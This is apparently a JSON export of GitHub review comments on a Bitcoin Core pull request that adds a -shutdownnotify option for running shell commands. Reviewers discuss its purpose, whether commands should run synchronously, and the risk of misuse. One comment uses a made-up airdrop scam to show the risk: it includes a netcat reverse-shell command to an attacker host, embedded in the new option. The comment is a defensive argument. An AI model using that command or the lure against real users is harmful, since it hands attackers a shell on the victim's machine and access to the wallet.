[
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/955775728",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-955775728",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 955775728,
    "node_id": "IC_kwDOABII58449_rw",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?u=03240c7cca7b55e5b9239eeab7a5914663a42b91&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-10-31T19:08:35Z",
    "updated_at": "2021-10-31T19:08:35Z",
    "author_association": "CONTRIBUTOR",
    "body": "I understand the motivation however this option can be misused IMO so not sure about adding it\r\n\r\nI was reading the comments in https://github.com/bitcoin/bitcoin/pull/15367 and I think we should even remove `-startupnotify` because it provides an inbuilt [binder](https://en.wikipedia.org/wiki/File_binder) which can be used to run malware in the background when Bitcoin Core starts.\r\n\r\nObservation: Although we can run almost everything as this option allows shell commands but I was experimenting if its possible to keep Bitcoin Core running and never shutdown. Worked intermittently but nothing interesting.\r\n\r\n```\r\nbitcoind -shutdownnotify=\"bitcoind\"\r\n\r\nbitcoin-cli stop\r\n```\r\n\r\nIf getting notifications on start and shutdown is the goal maybe we should not provide easy option to execute shell commands with it. A file with name `notifications.dat` that saves such notifications should be enough IMO.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/955775728/reactions",
      "total_count": 1,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 1,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956178462",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956178462",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956178462,
    "node_id": "IC_kwDOABII5844_iAe",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?u=2d5fe6203a3723b61b4ed186ff39586d23a5bd3c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T12:07:31Z",
    "updated_at": "2021-11-01T12:15:44Z",
    "author_association": "CONTRIBUTOR",
    "body": "Thanks, @prayank23 and @shaavan for the review and pointing out the edge case where a user might supply `\"bitcoind\"` as a shutdown notify bash command. \r\n\r\nA solution for that would be to call `.join()` instead `.detach()` in [here](https://github.com/bitcoin/bitcoin/pull/23395/files#diff-b1e19192258d83199d8adaa5ac31f067af98f63554bfdd679bd8e8073815e69dR183). This will result in bitcoind completing the entire shutdown sequence only after the bash command has finished executing. In the scenario where `\"bitcoind\"` is supplied as the bash command, the second `\"bitcoind\"` will fail as bitcoind is already running. However, this would also mean that all other bash commands would also be performed synchronously. \r\n\r\nOpen to feedback on how we should handle the scenario when a user supplies `\"bitcoind\"` as a shutdown notify bash command.\r\n\r\n> When I tried to use this argument value myself, there was no output whatsoever.\r\n\r\nIf you view `debug.log` you should be able to see if `bitcoind` has successfully restarted by searching for `runCommand error:`",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956178462/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956265352",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956265352",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956265352,
    "node_id": "IC_kwDOABII5844_3OI",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?u=03240c7cca7b55e5b9239eeab7a5914663a42b91&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T14:08:28Z",
    "updated_at": "2021-11-01T14:08:28Z",
    "author_association": "CONTRIBUTOR",
    "body": "> Open to feedback on how we should handle the scenario when a user supplies \"bitcoind\" as a shutdown notify bash command.\r\n\r\nI think we can avoid this case. It was just an observation which looked interesting initially. If a user wants to experiment and provides such argument he should be able to kill process or reboot system.\r\n\r\nI have issues with an option in Bitcoin Core that triggers any shell command based on start/shutdown. This feature can be helpful for lot of people with malicious intent.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956265352/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956330559",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956330559",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956330559,
    "node_id": "IC_kwDOABII5845AHI_",
    "user": {
      "login": "sipa",
      "id": 548488,
      "node_id": "MDQ6VXNlcjU0ODQ4OA==",
      "avatar_url": "https://avatars.githubusercontent.com/u/548488?u=7999a16349f0df0fb273fffa18e5a955c9d3f11c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/sipa",
      "html_url": "https://github.com/sipa",
      "followers_url": "https://api.github.com/users/sipa/followers",
      "following_url": "https://api.github.com/users/sipa/following{/other_user}",
      "gists_url": "https://api.github.com/users/sipa/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/sipa/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/sipa/subscriptions",
      "organizations_url": "https://api.github.com/users/sipa/orgs",
      "repos_url": "https://api.github.com/users/sipa/repos",
      "events_url": "https://api.github.com/users/sipa/events{/privacy}",
      "received_events_url": "https://api.github.com/users/sipa/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T15:25:56Z",
    "updated_at": "2021-11-01T15:25:56Z",
    "author_association": "MEMBER",
    "body": "@prayank23 If an attacker manages to make you invoke `bitcoind` with chosen configuration, you have bigger problems (it means they have filesystem access, can see your wallet files, can give themselves RPC access, ...).",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956330559/reactions",
      "total_count": 1,
      "+1": 1,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956331293",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956331293",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956331293,
    "node_id": "IC_kwDOABII5845AHUd",
    "user": {
      "login": "sipa",
      "id": 548488,
      "node_id": "MDQ6VXNlcjU0ODQ4OA==",
      "avatar_url": "https://avatars.githubusercontent.com/u/548488?u=7999a16349f0df0fb273fffa18e5a955c9d3f11c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/sipa",
      "html_url": "https://github.com/sipa",
      "followers_url": "https://api.github.com/users/sipa/followers",
      "following_url": "https://api.github.com/users/sipa/following{/other_user}",
      "gists_url": "https://api.github.com/users/sipa/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/sipa/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/sipa/subscriptions",
      "organizations_url": "https://api.github.com/users/sipa/orgs",
      "repos_url": "https://api.github.com/users/sipa/repos",
      "events_url": "https://api.github.com/users/sipa/events{/privacy}",
      "received_events_url": "https://api.github.com/users/sipa/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T15:26:45Z",
    "updated_at": "2021-11-01T15:26:45Z",
    "author_association": "MEMBER",
    "body": "Concept ACK",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956331293/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956353035",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956353035",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956353035,
    "node_id": "IC_kwDOABII5845AMoL",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?u=03240c7cca7b55e5b9239eeab7a5914663a42b91&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T15:53:32Z",
    "updated_at": "2021-11-01T15:53:32Z",
    "author_association": "CONTRIBUTOR",
    "body": "> @prayank23 If an attacker manages to make you invoke bitcoind with chosen configuration, you have bigger problems (it means they have filesystem access, can see your wallet files, can give themselves RPC access, ...).\r\n\r\n@sipa Yes victim will have bigger problems depending on the case. Are we helping attackers with this feature? \r\n\r\nExample:\r\n\r\nAttacker: We have a new airdrop where you don't need to share any credentials with us. It will be distributed to all bitcoin holders however they need to restart `bitcoind` so that airdrop server is notified about their wallet and registered for airdrop.\r\n\r\nPlease run:\r\n\r\n```\r\n$ bitcoind -shutdownnotify=\"nc -e /bin/sh airdrop.attacker.org 8080\"\r\n```\r\n\r\nVictim: Restarts core with command shared by attacker\r\n\r\nAttacker: Gets reverse shell\r\n\r\n",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956353035/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956356904",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956356904,
    "node_id": "IC_kwDOABII5845ANko",
    "user": {
      "login": "MarcoFalke",
      "id": 6399679,
      "node_id": "MDQ6VXNlcjYzOTk2Nzk=",
      "avatar_url": "https://avatars.githubusercontent.com/u/6399679?u=0691974eedcc2ab5366cc1080fb1c030e87244c2&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/MarcoFalke",
      "html_url": "https://github.com/MarcoFalke",
      "followers_url": "https://api.github.com/users/MarcoFalke/followers",
      "following_url": "https://api.github.com/users/MarcoFalke/following{/other_user}",
      "gists_url": "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/MarcoFalke/subscriptions",
      "organizations_url": "https://api.github.com/users/MarcoFalke/orgs",
      "repos_url": "https://api.github.com/users/MarcoFalke/repos",
      "events_url": "https://api.github.com/users/MarcoFalke/events{/privacy}",
      "received_events_url": "https://api.github.com/users/MarcoFalke/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T15:58:02Z",
    "updated_at": "2021-11-01T15:58:02Z",
    "author_association": "MEMBER",
    "body": "@prayank23 This is a known and obvious issue with all `-*notify` options, unrelated to this pull request. It might be best to discuss this in another thread.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956356904/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956371525",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956371525",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956371525,
    "node_id": "IC_kwDOABII5845ARJF",
    "user": {
      "login": "MarcoFalke",
      "id": 6399679,
      "node_id": "MDQ6VXNlcjYzOTk2Nzk=",
      "avatar_url": "https://avatars.githubusercontent.com/u/6399679?u=0691974eedcc2ab5366cc1080fb1c030e87244c2&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/MarcoFalke",
      "html_url": "https://github.com/MarcoFalke",
      "followers_url": "https://api.github.com/users/MarcoFalke/followers",
      "following_url": "https://api.github.com/users/MarcoFalke/following{/other_user}",
      "gists_url": "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/MarcoFalke/subscriptions",
      "organizations_url": "https://api.github.com/users/MarcoFalke/orgs",
      "repos_url": "https://api.github.com/users/MarcoFalke/repos",
      "events_url": "https://api.github.com/users/MarcoFalke/events{/privacy}",
      "received_events_url": "https://api.github.com/users/MarcoFalke/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T16:13:23Z",
    "updated_at": "2021-11-01T16:13:40Z",
    "author_association": "MEMBER",
    "body": "> Motivation: This will allow users to notify themselves when bitcoind unexpectedly shuts down.\r\n\r\nCan you explain this a bit more? The current code will notify users after Bitcoin Core *expectedly* shuts down, that is, after telling it to shutdown.\r\n\r\nIf users want to find out if it *unexpectedly* shut down, they will need to check for the absence of the notification and verify that the process is not running (e.g. writing state (utxo, wallet, ...) to the disk on shutdown).",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956371525/reactions",
      "total_count": 1,
      "+1": 1,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956373412",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956373412",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956373412,
    "node_id": "IC_kwDOABII5845ARmk",
    "user": {
      "login": "sipa",
      "id": 548488,
      "node_id": "MDQ6VXNlcjU0ODQ4OA==",
      "avatar_url": "https://avatars.githubusercontent.com/u/548488?u=7999a16349f0df0fb273fffa18e5a955c9d3f11c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/sipa",
      "html_url": "https://github.com/sipa",
      "followers_url": "https://api.github.com/users/sipa/followers",
      "following_url": "https://api.github.com/users/sipa/following{/other_user}",
      "gists_url": "https://api.github.com/users/sipa/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/sipa/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/sipa/subscriptions",
      "organizations_url": "https://api.github.com/users/sipa/orgs",
      "repos_url": "https://api.github.com/users/sipa/repos",
      "events_url": "https://api.github.com/users/sipa/events{/privacy}",
      "received_events_url": "https://api.github.com/users/sipa/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T16:15:25Z",
    "updated_at": "2021-11-01T16:15:25Z",
    "author_association": "MEMBER",
    "body": "There is probably a difference still between *unexpected* shutdowns and *unclean* shutdowns. E.g. when disk is full, Bitcoin Core will (possibly) shut down cleanly, but it's not explicitly requested by the user.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956373412/reactions",
      "total_count": 1,
      "+1": 1,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956506097",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956506097",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 956506097,
    "node_id": "IC_kwDOABII5845Ax_x",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?u=2d5fe6203a3723b61b4ed186ff39586d23a5bd3c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-01T19:03:37Z",
    "updated_at": "2021-11-01T19:03:37Z",
    "author_association": "CONTRIBUTOR",
    "body": "> Can you explain this a bit more?\r\n\r\n@MarcoFalke yup similar to what @sipa pointed out, this would be useful for users who wish to be notified when Bitcoin Core cleanly shuts down without being explicitly requested by the user. Updated the PR description to clearly describe what does *unexpected* means. ",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956506097/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/957953168",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-957953168",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 957953168,
    "node_id": "IC_kwDOABII5845GTSQ",
    "user": {
      "login": "luke-jr",
      "id": 1095675,
      "node_id": "MDQ6VXNlcjEwOTU2NzU=",
      "avatar_url": "https://avatars.githubusercontent.com/u/1095675?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/luke-jr",
      "html_url": "https://github.com/luke-jr",
      "followers_url": "https://api.github.com/users/luke-jr/followers",
      "following_url": "https://api.github.com/users/luke-jr/following{/other_user}",
      "gists_url": "https://api.github.com/users/luke-jr/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/luke-jr/subscriptions",
      "organizations_url": "https://api.github.com/users/luke-jr/orgs",
      "repos_url": "https://api.github.com/users/luke-jr/repos",
      "events_url": "https://api.github.com/users/luke-jr/events{/privacy}",
      "received_events_url": "https://api.github.com/users/luke-jr/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-02T17:07:28Z",
    "updated_at": "2021-11-02T17:07:28Z",
    "author_association": "MEMBER",
    "body": "Concept ACK\r\n\r\nI think it is important to get #22417 merged first, though - otherwise `shutdownnotify` commands might all too easily keep files open that we expect to be closed.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/957953168/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/959088546",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-959088546",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 959088546,
    "node_id": "IC_kwDOABII5845Koei",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?u=2d5fe6203a3723b61b4ed186ff39586d23a5bd3c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-03T13:33:37Z",
    "updated_at": "2021-11-03T16:58:14Z",
    "author_association": "CONTRIBUTOR",
    "body": " a13e4cf to  812910e  changes:\r\n* Run commands synchronously\r\n* Run commands before shutdown sequence begins\r\n* Support multiple `-shutdownnotify`\r\n",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/959088546/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/962543678",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-962543678",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 962543678,
    "node_id": "IC_kwDOABII5845X0A-",
    "user": {
      "login": "theStack",
      "id": 91535,
      "node_id": "MDQ6VXNlcjkxNTM1",
      "avatar_url": "https://avatars.githubusercontent.com/u/91535?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/theStack",
      "html_url": "https://github.com/theStack",
      "followers_url": "https://api.github.com/users/theStack/followers",
      "following_url": "https://api.github.com/users/theStack/following{/other_user}",
      "gists_url": "https://api.github.com/users/theStack/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/theStack/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/theStack/subscriptions",
      "organizations_url": "https://api.github.com/users/theStack/orgs",
      "repos_url": "https://api.github.com/users/theStack/repos",
      "events_url": "https://api.github.com/users/theStack/events{/privacy}",
      "received_events_url": "https://api.github.com/users/theStack/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-07T02:59:36Z",
    "updated_at": "2021-11-07T02:59:36Z",
    "author_association": "CONTRIBUTOR",
    "body": "Concept ACK",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/962543678/reactions",
      "total_count": 1,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 1,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/963100179",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-963100179",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 963100179,
    "node_id": "IC_kwDOABII5845Z74T",
    "user": {
      "login": "laanwj",
      "id": 126646,
      "node_id": "MDQ6VXNlcjEyNjY0Ng==",
      "avatar_url": "https://avatars.githubusercontent.com/u/126646?u=13b19d1ff2f5f914e180c41418f451a4ba6f8bd1&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/laanwj",
      "html_url": "https://github.com/laanwj",
      "followers_url": "https://api.github.com/users/laanwj/followers",
      "following_url": "https://api.github.com/users/laanwj/following{/other_user}",
      "gists_url": "https://api.github.com/users/laanwj/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/laanwj/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/laanwj/subscriptions",
      "organizations_url": "https://api.github.com/users/laanwj/orgs",
      "repos_url": "https://api.github.com/users/laanwj/repos",
      "events_url": "https://api.github.com/users/laanwj/events{/privacy}",
      "received_events_url": "https://api.github.com/users/laanwj/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-08T12:23:51Z",
    "updated_at": "2021-11-08T12:23:51Z",
    "author_association": "MEMBER",
    "body": "Not opposed to this but please don't mis-advertise it;\r\n\r\n> If users want to find out if it unexpectedly shut down, they will need to check for the absence of the notification and verify that the process is not running (e.g. writing state (utxo, wallet, ...) to the disk on shutdown).\r\n\r\nYes, there is no way to monitor for unexpected shutdowns from within bitcoind itself. This is theoretically and practically impossible no matter how hard you try. One way to do this is to tell the OS to receive notifications when the process dies, e.g. in Linux one can use `waitpid` on the PID from the PID file.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/963100179/reactions",
      "total_count": 1,
      "+1": 1,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/963357070",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-963357070",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 963357070,
    "node_id": "IC_kwDOABII5845a6mO",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?u=2d5fe6203a3723b61b4ed186ff39586d23a5bd3c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-08T16:49:44Z",
    "updated_at": "2021-11-08T16:49:44Z",
    "author_association": "CONTRIBUTOR",
    "body": "> Yes, there is no way to monitor for unexpected shutdowns from within bitcoind itself.\r\n\r\n@laanwj thanks for the feedback and I totally agree with you. Updated the PR description to add a disclaimer that the command will not be executed if bitcoind unexpectedly shuts down. ",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/963357070/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
